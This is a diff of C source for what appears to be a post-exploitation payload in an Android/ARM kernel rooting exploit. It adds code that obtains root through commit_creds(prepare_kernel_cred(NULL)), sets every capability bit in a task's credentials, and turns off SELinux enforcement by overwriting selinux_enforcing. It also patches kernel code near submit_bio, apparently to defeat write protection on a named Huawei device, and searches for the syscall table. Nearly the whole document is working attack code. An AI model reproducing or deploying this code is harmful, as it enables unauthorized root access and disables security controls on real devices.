@@ -1,12 +1,18 @@
 #include <stdio.h>
 #include <stdlib.h>
+#include <sys/prctl.h>
 
 
 #define KERNEL_START     0xc0008000
 
 extern unsigned long lookup_sym(const char *name);
 
-int (*my_printk)(const char *fmt, ...);
+int (*my_printk)(const char *fmt, ...) = NULL;
+void (*my_selnl_notify_setenforce)(int val) = NULL;
+void (*my_selinux_status_update_setenforce)(int enforcing) = NULL;
+
+struct task_struct;
+extern int socket_fd_exploit;
 
 struct kernel_cap_struct {
 	unsigned long cap[2];
@@ -59,68 +65,83 @@ struct task_struct_partial {
 	char comm[16];
 };
 
+static void shutdown_selinux()
+{
+	int *selinux_enforce = NULL;
+
+	selinux_enforce = lookup_sym("selinux_enforcing");
+	my_selnl_notify_setenforce = lookup_sym("selnl_notify_setenforce");
+	my_selinux_status_update_setenforce = lookup_sym("selinux_status_update_setenforce");
+	if (selinux_enforce && *selinux_enforce == 1) {
+		*selinux_enforce = 0;
+                if (my_selnl_notify_setenforce && my_selinux_status_update_setenforce) {
+                        my_selnl_notify_setenforce(0);
+                        my_selinux_status_update_setenforce(0);
+                }
+
+	}
+}
+
 
 int root_by_commit_cred()
 {
-        struct cred *(*my_prepare_kernel_cred)(struct task_struct *daemon);
+        struct cred *(*my_prepare_kernel_cred)(struct task_struct *daemon) = NULL;
 
-        int (*my_commit_creds)(struct cred *new);
+        int (*my_commit_creds)(struct cred *new) = NULL;
 
+        struct file;
+        struct file * (*my_fget) (unsigned int fd) = NULL;
+
+        my_printk = lookup_sym("printk");
+        if (my_printk) {
+                my_printk("CALLED in kernel OK!\n");
+        }
+        /* walkaround for sock tag */
+        my_fget = lookup_sym("fget");
         my_prepare_kernel_cred = lookup_sym("prepare_kernel_cred");
         my_commit_creds = lookup_sym("commit_creds");
-        if (my_prepare_kernel_cred &&
-            my_commit_creds) {
+        if (my_prepare_kernel_cred && my_commit_creds) {
                 my_commit_creds(my_prepare_kernel_cred(NULL));
+                shutdown_selinux();
+                if (my_fget) {
+                        my_fget(socket_fd_exploit);
+                }
                 return 0;
         }
         return 1;
 }
 
+/* for HUAWEI X5 */
 int mod_wp()
 {
-        unsigned int *p;
-        unsigned int *head, *end;
-        unsigned int tmp;
-        unsigned int *t;
-        
-        p = (unsigned int*)lookup_sym("submit_bio");
+        unsigned long *p;
+        unsigned long *end;
+        unsigned long tmp;
+        unsigned long *t;
+
+        p = (unsigned long*)lookup_sym("submit_bio");
         if (!p) {
                 my_printk("can not find symbol addr!\n");
                 return 0;
         }
-        head = p;
-        
-        end = p + (0x400 / sizeof(unsigned int*));
+
+        end = p + (0x400 / sizeof(unsigned long*));
         while(p < end) {
 
                 if ((*p & ~0xfff) == 0xe59f1000) {
                         if ((*(p + 1) & 0xff000000) == 0xeb000000) {
                                 tmp = *p << 20;
-                                t = (tmp >> 20) + (unsigned int)p;
-                                t = *(t + 2);
+                                t = (unsigned long *)((tmp >> 20) + (unsigned long)p);
+                                t = (unsigned long *)*(t + 2);
                                 if (*t == 0x41414141) {
                                         return 2;
                                 }
                                 else if (*t == 0x62636d6d) {
-                                //if (*t == 0x41414141) {
                                         *t = 0x41414141;
-                                        /*
-                                        printk("CODE: Find TA!\n");
-                                        printk("CODE: offset = %x\n", (p - head) * 4);
-                                        printk("CODE: +0 0x%08x\n", *p);
-                                        printk("CODE: 10 inst after\n");
-                                        for (i = 1; i < 10; i++) {
-                                                printk("CODE: +%d 0x%08x\n", i*4, *(p + i));
-                                        }
-                                        printk("CODE: str +0 0x%08x\n", *(t + 1));
-                                        printk("CODE: str +4 0x%08x\n", *(t + 2));
-                                        printk("CODE: str +8 0x%08x\n", *(t + 3));
-                                        */
                                         return 1;
                                 }
                         }
                 }
-                //printk("CODE: 0x%08x\n", *p);
                 p++;
         }
         return 0;
@@ -130,8 +151,8 @@ int test()
 {
         my_printk = lookup_sym("printk");
         if (my_printk) {
-                //my_printk("invoke OK!\n");
-                return 123;
+                my_printk("invoke OK!\n");
+                //return 123;
         }
         return 0;
 }
@@ -141,22 +162,20 @@ int root_by_set_cred(void)
         unsigned long s;
         unsigned long *taskbuf;
         struct task_struct_partial *task;
-        struct cred *cred;
-        struct cred credbuf;
+        struct cred *cred = NULL;
         struct task_security_struct *security;
-	struct task_security_struct securitybuf;
         int i;
-        
+
         __asm__ ("mov %0,sp"
               :"=r"(s)
                 );
-        
+
         s &= ~0x1fff;
 
-        taskbuf = *(unsigned long*)(s + 0xc);
+        taskbuf = (unsigned long *)*(unsigned long*)(s + 0xc);
 
         for (i = 0; i < 0x100; i++) {
-                task = taskbuf + i;
+                task = (struct task_struct_partial *)(taskbuf + i);
                 if (task->cpu_timers[0].next == task->cpu_timers[0].prev
                     && (unsigned long)task->cpu_timers[0].next > KERNEL_START
                     && task->cpu_timers[1].next == task->cpu_timers[1].prev
@@ -168,6 +187,9 @@ int root_by_set_cred(void)
                         break;
                 }
         }
+
+        if (cred == NULL)
+                return 1;
 
         security = cred->security;
         if ((unsigned long)security > KERNEL_START
@@ -201,8 +223,9 @@ int root_by_set_cred(void)
         cred->cap_effective.cap[1] = 0xffffffff;
         cred->cap_bset.cap[0] = 0xffffffff;
         cred->cap_bset.cap[1] = 0xffffffff;
-        
-        return 1;
+
+        shutdown_selinux();
+        return 0;
 }
 
 unsigned long find_syscall_table()
@@ -222,7 +245,7 @@ unsigned long find_syscall_table()
         /* if (ret == -1) */
         /*         perror("semop:"); */
 
-        /* vector_swi +  __sys_trace  + __sys_trace_return  */ 
+        /* vector_swi +  __sys_trace  + __sys_trace_return  */
         addr += 0x74 + 0x2c + 0x18;
         addr = (addr + (1 << 5) - 1) & ~0x1f;  /* align 5: __cr_alignment */
         addr += 0x4;            /* + _cr_alignment */
